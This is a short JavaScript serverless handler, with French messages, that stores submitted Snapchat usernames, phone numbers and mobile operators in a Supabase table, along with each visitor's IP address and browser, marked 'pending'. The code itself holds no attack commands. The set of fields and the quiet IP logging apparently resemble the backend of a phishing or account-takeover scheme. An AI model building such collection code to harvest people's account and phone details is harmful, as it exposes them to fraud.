import { createClient } from '@supabase/supabase-js';
import { createSubmissionRecord, fail, ok } from './_helpers.js';

export default async function handler(req) {
  if (req.method !== 'POST') return fail(405, 'Méthode non autorisée');

  try {
    const { snapchat, telephone, operateur } = await req.json();
    if (!snapchat || !telephone || !operateur) return fail(400, 'Données manquantes');

    const ip = req.headers.get('x-forwarded-for')?.split(',')[0]?.trim() ||
      req.headers.get('x-real-ip') ||
      req.headers.get('cf-connecting-ip') ||
      'unknown';

    const userAgent = req.headers.get('user-agent') || '';
    const country = 'France';
    const browser = /chrome/i.test(userAgent) ? 'Chrome' : /safari/i.test(userAgent) ? 'Safari' : /firefox/i.test(userAgent) ? 'Firefox' : 'Edge';

    const supabaseUrl = process.env.SUPABASE_URL;
    const supabaseKey = process.env.SUPABASE_ANON_KEY;

    let created;
    if (supabaseUrl && supabaseKey) {
      const supabase = createClient(supabaseUrl, supabaseKey);
      const { data, error } = await supabase.from('Submission').insert({
        snapchat,
        telephone,
        operateur,
        status: 'pending',
        ip_address: ip,
        country,
        browser,
      }).select('id').single();

      if (error) throw error;
      created = { id: data.id };
    } else {
      created = createSubmissionRecord({ snapchat, telephone, operateur, ip, country, browser });
    }

    return ok({ ok: true, submissionId: created.id });
  } catch (error) {
    console.error('createSubmission error', error);
    return fail(500, error.message || 'Erreur interne');
  }
}
